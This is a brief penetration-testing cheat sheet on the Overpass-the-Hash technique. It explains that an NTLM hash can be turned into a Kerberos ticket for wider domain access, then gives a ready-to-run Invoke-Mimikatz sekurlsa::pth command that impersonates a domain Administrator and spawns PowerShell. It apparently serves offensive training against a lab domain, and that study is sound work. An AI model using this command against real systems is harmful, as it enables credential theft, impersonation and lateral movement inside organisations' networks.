# Overpass the Hash

## General

- Similar to pass-the-hash
- Creates valid kerberos ticket from NTLM hash of user
- Able to access any domain service and not just services that support NTLM authentication like in PTH attacks

## Exploitation with Invoke-Mimikatz

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:lab.local /ntlm:<HASH> /run:powershell.exe"'
```
